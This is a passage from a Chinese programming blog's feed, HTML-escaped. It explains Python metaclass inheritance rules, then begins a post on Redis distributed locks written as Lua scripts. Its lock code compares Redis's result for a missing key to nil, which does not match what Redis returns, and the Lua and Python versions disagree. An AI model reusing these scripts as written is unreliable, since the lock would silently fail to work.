&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaC&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>元类可以接受参数，参数必须是命名的，传递参数的方式是写在类声明的继承列表里。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">meta&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">named_arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">optional_arg&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arg&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">named_arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">option&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">optional_arg&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">meta&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">named_arg&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;hi&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># output: hi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>位置参数都会被当成继承列表，作为&lt;code>bases&lt;/code>参数(list)的一部分传入元类。&lt;/p>
&lt;h2 id="3-元类继承规则">3. 元类继承规则&lt;/h2>
&lt;p>有了元类那么就有了相应继承规则，显而易见。元类用于构造一个类，两个父类分别有一个不同的元类显然会造成冲突：这个子类用哪个元类构造？&lt;/p>
&lt;p>首先看元类的在创建类的过程中的位置，摘自 python 文档&lt;a class="link" href="https://docs.python.org/3/reference/datamodel.html#metaclasses" target="_blank" rel="noopener"
>3.3.3.1. Metaclasses&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>MRO entries are resolved&lt;/li>
&lt;li>the appropriate metaclass is determined&lt;/li>
&lt;li>the class namespace is prepared&lt;/li>
&lt;li>the class body is executed&lt;/li>
&lt;li>the class object is created&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>一旦处理完继承链（mro, method resolve order）之后，就会决定采用哪个 metaclass 作为构造这个类的元类。&lt;/p>
&lt;p>在 python 文档的&lt;a class="link" href="https://docs.python.org/3/reference/datamodel.html#determining-the-appropriate-metaclass" target="_blank" rel="noopener"
>3.3.3.3 determining the appropriate metaclass&lt;/a>中描述了如何确定合适的元类，摘录如下。&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>if no bases and no explicit metaclass are given, then type() is used&lt;/li>
&lt;li>if an explicit metaclass is given and it is not an instance of type(), then it is used directly as the metaclass&lt;/li>
&lt;li>if an instance of type() is given as the explicit metaclass, or bases are defined, then the most derived metaclass is used&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>翻译如下&lt;/p>
&lt;ul>
&lt;li>如果没有基类也没有指定 metaclass，那么&lt;code>type()&lt;/code>将作为元类使用。&lt;/li>
&lt;li>如果指定了元类，并且该元类不是 type 的实例，那么直接使用这个元类。&lt;/li>
&lt;li>如果元类是一个 type 的实例，或者存在基类，那么使用最衍生的元类。&lt;/li>
&lt;/ul>
&lt;p>有一个比较难理解的点是&lt;/p>
&lt;blockquote>
&lt;p>most derived metaclass&lt;/p>
&lt;/blockquote>
&lt;p>也就是所谓的&lt;strong>最衍生的元类&lt;/strong>。惯例，先放文档解释&lt;/p>
&lt;blockquote>
&lt;p>The most derived metaclass is selected from the explicitly specified metaclass (if any) and the metaclasses (i.e. type(cls)) of all specified base classes. The most derived metaclass is one which is a subtype of all of these candidate metaclasses. If none of the candidate metaclasses meets that criterion, then the class definition will fail with TypeError.&lt;/p>
&lt;/blockquote>
&lt;p>简单翻译如下&lt;/p>
&lt;blockquote>
&lt;p>最衍生的元类会从类声明中明确提供的元类，还有所有明确继承的基类的元类中选择。最衍生的元类是以上所有候选元类的子类型，如果没有类型符合这一条件，则抛出&lt;code>TypeError&lt;/code>异常。&lt;/p>
&lt;/blockquote>
&lt;p>重点在于，&lt;strong>最衍生的元类必须是&lt;/strong>，所有继承的基类的元类和指定元类的&lt;strong>子类型&lt;/strong>。&lt;/p>
&lt;p>在这里提醒一下，&lt;code>issubclass(cls, cls)&lt;/code>的结果是&lt;code>True&lt;/code>。换句话说，必须有一个类是所有元类的子类，或者所有基类有相同的元类。&lt;/p>
&lt;p>代码举例如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">MetaA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;MetaA &amp;lt;- &amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">MetaB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;MetaB &amp;lt;- &amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">BaseA&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">BaseB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaA&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">BaseC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaB&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="c1"># 未指定元类，基类元类分别是type和type的子类，则选择继承链底部的那个类&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BaseA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">BaseB&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># Ok,元类是 MetaA&lt;/span>
&lt;span class="c1"># 指定元类，元类和基类元类相同的情况下，元类就是那个元类&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">C&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BaseB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaA&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># Ok，元类是 MetaA&lt;/span>
&lt;span class="c1"># 指定元类，元类并不处于继承链底端的情况下，元类选择继承链底端的类&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">D&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BaseB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># Ok，元类是 MetaA&lt;/span>
&lt;span class="c1"># 指定元类，但元类和父类无父子类关系&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">E&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BaseC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaA&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># TypeError&lt;/span>
&lt;span class="c1"># 不指定元类，基类具有不同的元类&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">F&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BaseA&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">BaseB&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">BaseC&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># TypeError&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">MetaA &amp;lt;- A
MetaA &amp;lt;- C
MetaA &amp;lt;- D
In [71]: class E(BaseC, metaclass=MetaA): ... # TypeError
---------------------------------------------------------------------------
TypeError Traceback (most recent call last)
&amp;lt;ipython-input-71-9129a36c52b2&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 class E(BaseC, metaclass=MetaA): ... # TypeError
TypeError: metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases
In [72]: class F(BaseA,BaseB,BaseC): ... # TypeError
---------------------------------------------------------------------------
TypeError Traceback (most recent call last)
&amp;lt;ipython-input-72-1c510edd69d1&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 class F(BaseA,BaseB,BaseC): ... # TypeError
TypeError: metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但元类是函数的情况下会有比较特殊的表现，注意规则二。&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>如果指定了元类，并且该元类不是 type 的实例，那么直接使用这个元类。&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>如果函数形式的元类作为父类的元类时不会列入选择，除非指定当前类的元类为函数，才会调用函数形式的元类，而且是无条件选择这个函数形式的元类。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">MetaA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;MetaA &amp;lt;- &amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">MetaB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MetaB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaA&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># Ok，无条件选择元类 MetaA&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>python 实现 redis 分布式锁</title><link>https://nnnewb.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-redis-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</link><pubDate>Mon, 17 Dec 2018 14:57:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-redis-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>分布式不是啥黑魔法，究其理念无非是用多台服务器处理更多的请求。提高每秒处理的数据量，并发就不可避免了。&lt;/p>
&lt;p>在单机并发的情况下，我们可以用 mutex，可以用 os 的文件锁，全局锁，多台服务器的并发就需要另一个持有并保护锁的角色了。&lt;/p>
&lt;p>概述如何使用 redis 实现一个分布式锁。&lt;/p>
&lt;h2 id="为何是-lua">为何是 Lua&lt;/h2>
&lt;p>redis 保证了 lua 解释器执行脚本的事务性，即执行结果要么不可见，要么已完成。&lt;/p>
&lt;p>参考&lt;a class="link" href="http://redisdoc.com/script/eval.html" target="_blank" rel="noopener"
>这篇文档&lt;/a>。&lt;/p>
&lt;h2 id="简单锁">简单锁&lt;/h2>
&lt;p>简单锁指的是简单互斥锁，一旦锁定，则其他锁定请求都必须等待。&lt;/p>
&lt;h3 id="加锁">加锁&lt;/h3>
&lt;p>直觉的想法是通过 redis 的键来保持锁，故准备一个用于锁定互斥的名字（比如说 mutex-1）然后指定为键。&lt;/p>
&lt;p>直接使用 set 是显然不正确的，如果临界区内程序崩溃或意外断网将导致死锁，所以 setnx 和 expire 是必选项。&lt;/p>
&lt;p>加锁需要判断锁的键为空，才能加锁，这两步必须保证原子性，要么都执行，要么一个都不执行。幸好 redis 提供了这方面保证，只要使用 lua 脚本的话。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 加锁&lt;/span>
&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;setnx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;expire&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="kr">else&lt;/span>
&lt;span class="kr">return&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面的 lua 代码用 python 再封装一层，就是这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expire&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span class="s1">-- 加锁
&lt;/span>&lt;span class="s1">if redis.call(&amp;#34;get&amp;#34;, KEYS[1]) == nil then
&lt;/span>&lt;span class="s1"> if redis.call(&amp;#34;setnx&amp;#34;, KEYS[1], ARGV[1]) ~= nil then
&lt;/span>&lt;span class="s1"> redis.call(&amp;#34;expire&amp;#34;, KEYS[1], ARGV[2])
&lt;/span>&lt;span class="s1"> return 1
&lt;/span>&lt;span class="s1"> else
&lt;/span>&lt;span class="s1"> return
&lt;/span>&lt;span class="s1"> end
&lt;/span>&lt;span class="s1">end
&lt;/span>&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;lock&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expire&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解锁">解锁&lt;/h3>
&lt;p>解锁代码同样是通过 lua 实现。&lt;/p>
&lt;p>下面是&lt;strong>错误实现例子&lt;/strong>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;del&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>错误之处在于会解除非自己加的锁。如果临界区内的工作时间超过预期时间，那么就会造成误解锁的问题。&lt;/p>
&lt;p>下面是&lt;strong>正确例子&lt;/strong>。&lt;/p>
&lt;p>为了标记锁持有者，需要修改加锁代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expire&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span class="s1">-- 加锁
&lt;/span>&lt;span class="s1">if redis.call(&amp;#34;get&amp;#34;, KEYS[1]) == nil then
&lt;/span>&lt;span class="s1"> if redis.call(&amp;#34;setnx&amp;#34;, KEYS[1], ARGV[1]) ~= nil then
&lt;/span>&lt;span class="s1"> redis.call(&amp;#34;expire&amp;#34;, KEYS[1], ARGV[2])
&lt;/span>&lt;span class="s1"> return 1
&lt;/span>&lt;span class="s1"> else
&lt;/span>&lt;span class="s1"> return
&lt;/span>&lt;span class="s1"> end
&lt;/span>&lt;span class="s1">end
&lt;/span>&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expire&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>解锁的 lua 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 解锁&lt;/span>
&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;del&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="kr">else&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>解锁的 python 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lock&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span class="s1">-- 解锁
&lt;/span>&lt;span class="s1">if redis.call(&amp;#34;get&amp;#34;, KEYS[1]) == ARGV[1] then
&lt;/span>&lt;span class="s1"> return redis.call(&amp;#34;del&amp;#34;, KEYS[1])
&lt;/span>&lt;span class="s1">else
&lt;/span>&lt;span class="s1"> return 0
&lt;/span>&lt;span class="s1">end
&lt;/span>&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lock&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="超时和一致性">超时和一致性&lt;/h3>
&lt;p>关于超时有这样一个问题在。如果超时时间过长，那么超时的设置意义就不大，服务宕机 1 小时和宕机 24 小时都是事故。如果超时时间过短，那么超时就可能造成一致性上的损害。&lt;/p>
&lt;p>举例来说，付款处理花了 2.1s，但是锁超时 2.0s。这 0.1s 的数据竞争时间里，更新&lt;code>update balance where id = xxx&lt;/code>和下一个更新 blance 的请求就指不定谁先执行了。&lt;/p>
&lt;pre>&lt;code class="language-mermaid" data-lang="mermaid">sequenceDiagram
participant 付款
participant 汇款
participant 锁
付款-&amp;gt;&amp;gt;锁:请求锁
锁--&amp;gt;&amp;gt;付款:已锁定
汇款-&amp;gt;&amp;gt;锁:请求锁
note over 付款,锁: 锁在2秒后超时，付款程序在2.1秒后完成
note over 锁: 2.0s到了，超时解锁
锁--&amp;gt;&amp;gt;汇款:已锁定
note over 付款,汇款:数据竞争
note over 付款:完成。
&lt;/code>&lt;/pre>&lt;p>所以，设置了超时，那么必须保证一致性，整个处理要么全部完成，要么超时全部未完成，对编程能力提出了挑战。&lt;/p>
&lt;p>后续再想想能不能写篇博文。&lt;/p>
&lt;h2 id="读写锁">读写锁&lt;/h2>
&lt;p>读写锁的实现和简单锁别无二致，特征是多个读，一个写。在大量读取，少量写入的情况下，读写锁可以有效提高效率。&lt;/p>
&lt;h3 id="加读锁">加读锁&lt;/h3>
&lt;p>读锁实现和简单锁差别不大，在简单锁基础上稍作修改即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 读锁&lt;/span>
&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:write&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="kr">else&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hset&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:read&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="加写锁">加写锁&lt;/h3>
&lt;p>写锁实现差别也不大，这里使用 hash table 解决标记持有人的问题。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 写锁&lt;/span>
